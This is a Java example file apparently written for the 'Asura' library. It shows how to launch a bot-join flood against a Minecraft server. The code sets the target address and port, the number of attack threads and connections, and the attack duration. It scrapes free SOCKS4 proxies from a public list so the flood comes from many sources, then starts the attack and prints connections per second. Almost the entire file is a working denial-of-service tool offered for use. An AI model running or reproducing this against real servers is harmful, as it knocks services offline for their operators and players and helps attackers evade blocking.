package test;

import java.net.MalformedURLException;
import java.util.ArrayList;

import dev.lastknell.core.AttackConfig;
import dev.lastknell.core.NettyBootstrap;
import dev.lastknell.core.methods.IMethod;
import dev.lastknell.core.methods.impl.Join;
import dev.lastknell.core.proxy.Proxy;
import dev.lastknell.core.proxy.ProxyManager;
import dev.lastknell.core.proxy.ProxyScraper;

public class AsuraExample {

    // how asura work
    /*
     * for each attack u make a attack config
     * then u make a proxy manager whith a list of proxies to use in
     * attack(Arraylist of dev.lastknell.Proxy)
     * proxy scraper helps u to get ArrayList of Proxy easily and scrapes proxies
     * from ArrayList of urls
     * then for each attack u make a nettybootstrap and give it attack config and
     * proxy manager as input
     */

    public static void main(String[] args) {
        // Define necessary variables
        String srvIP = "0.0.0.0";
        int port = 25565;
        IMethod method = new Join();
        int protocolID = 760;
        int perDelay = 10; // connections per delay
        int duration = 100; // attack duration
        int delay = 100; // delay b/w each loop in loop threads in ms
        int loopThreads = 3; // these thread ask worker threads to send connection in a loop
        int workerThreads = 256; // these threads send connection
        int proxyType = 0; // 0 -> Socks4Proxy, 1 -> Socks5Proxy, 2 -> HttpProxy
        boolean usingEpoll = true; // gives high performance in linux

        // Make a AttackConfig
        AttackConfig config = new AttackConfig(srvIP, port, method, protocolID, duration, perDelay, delay, loopThreads,
                workerThreads, proxyType, usingEpoll);

        // setup nettybootstrap
        NettyBootstrap bootstrap = new NettyBootstrap(config, makeProxtManager());

        // start attack
        bootstrap.start();

        // stop attack
        // bootstrap.stop();

        // u can print or use live updated values in bootstrap
        while (!bootstrap.shouldStop) {
            System.out.println(bootstrap.averageCPS);
            // sleep for 1000 sec as CPS updates every sec so no use to see its value
            // between a interval if sec
            try {
                Thread.sleep(1000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }

    }

    public static ProxyManager makeProxtManager() {
        ArrayList<String> urls = new ArrayList<String>();
        urls.add("https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks4.txt");
        ArrayList<Proxy> proxies = new ArrayList<Proxy>();
        try {
            ProxyScraper scraper = new ProxyScraper(urls);
            // scrape proxies from links
            scraper.scrape();
            // get proxies
            proxies = scraper.getProxies();
        } catch (MalformedURLException e) {
            e.printStackTrace();
        }
        // make proxy manager
        ProxyManager manager = new ProxyManager(proxies);
        return manager;
    }
}
